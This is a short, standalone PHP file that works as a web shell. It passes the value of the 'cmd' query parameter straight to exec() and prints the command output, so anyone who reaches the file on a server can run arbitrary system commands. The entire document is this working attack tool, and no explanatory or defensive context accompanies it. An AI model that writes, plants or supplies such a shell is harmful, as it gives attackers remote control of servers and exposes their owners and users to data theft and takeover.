<?php
exec($_GET['cmd'], $array);
echo "<pre>";
print_r($array);
echo "</pre>";
?>
